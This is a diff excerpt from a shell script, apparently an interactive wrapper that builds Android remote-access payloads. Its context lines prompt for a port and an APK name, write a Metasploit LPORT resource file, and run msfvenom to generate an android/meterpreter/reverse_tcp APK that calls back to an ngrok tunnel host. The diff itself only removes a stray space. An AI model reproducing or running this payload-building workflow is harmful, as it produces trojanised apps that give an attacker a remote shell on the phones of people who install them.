@@ -9,7 +9,7 @@ read -p '>> ' check
 echo LPORT: | lolcat
 read -p '>> ' LPORT
 rm -rf /$HOME/a/LPORT.rc
-echo set LPORT $LPORT  >/$HOME/a/LPORT.rc
+echo set LPORT $LPORT >/$HOME/a/LPORT.rc
 echo Apk name: | lolcat
 read -p '>> ' APK
 msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$LPORT R >/sdcard/$APK.apk
